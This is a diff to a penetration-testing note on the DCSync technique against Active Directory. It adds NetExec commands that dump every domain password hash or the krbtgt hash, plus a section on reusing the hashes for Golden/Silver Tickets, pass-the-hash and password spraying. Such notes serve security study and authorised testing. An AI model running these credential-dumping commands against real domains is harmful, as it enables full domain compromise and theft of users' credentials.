@@ -10,6 +10,9 @@ tags:
  
 DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve any NTLM password hashes from the domain users.
 
+> [!Note]
+> DCSync is usually reached after abusing dangerous ACLs on the domain object — see [[AD ACL Enumeration and Abuse]] for how an account gains the replication rights, and [[AD Enumeration with PowerView]] for enumerating them.
+
 > [!Requirements]
 > - Access control over an account that has the rights to perform domain replication (a user with the `Replicating Directory Changes`, `Replicating Directory Changes All` and `Replicating Directory Changes in Filtered Set` permissions set).
 > - By default, members of the _Domain Admins_, _Enterprise Admins_, and _Administrators_ groups have these rights assigned
@@ -98,5 +101,28 @@ mimikatz # lsadump::dcsync /domain:DOMAIN_FQDN /user:DOMAIN_NAME\DOMAIN_USER (du
 > [!Note]
 > - Using mimikatz we can only target a specific user
 > - Mimikatz must be ran in the context of the user who has DCSync privileges
+
+**With NetExec / CrackMapExec (from Linux)**
+
+The `ntdsutil`/`--ntds` module performs a DCSync when the supplied account has the replication rights, dumping every hash in one shot:
+```bash
+$ netexec smb DC_IP -u USER -p 'PASSWORD' --ntds
+# or target a single account:
+$ netexec smb DC_IP -u USER -p 'PASSWORD' --ntds --user krbtgt
+```
+
+# What to do with the loot
+
+The dumped hashes feed directly into the rest of the AD kill chain:
+- The **`krbtgt`** hash lets you forge a Golden Ticket → [[Golden Ticket]].
+- A **service account** hash (or its AES key) lets you forge a Silver Ticket → [[Silver Ticket]].
+- Any user hash can be reused directly with [[Pass the Hash (PtH)]] or [[Pass the Ticket (PtT)]] for lateral movement — no cracking required.
+- Cracked cleartext passwords can be sprayed with [[AD Password Spraying]].
+
+## Related notes
+- [[AD ACL Enumeration and Abuse]] — how replication rights are granted/abused to enable DCSync
+- [[Kerberoasting]] / [[AS-REP Roasting]] — alternative credential-theft techniques earlier in the chain
+- [[Golden Ticket]] / [[Silver Ticket]] — forging tickets from the extracted `krbtgt` / service hashes
+- [[Pass the Hash (PtH)]] / [[Pass the Ticket (PtT)]] — reusing the dumped hashes for lateral movement
 
 
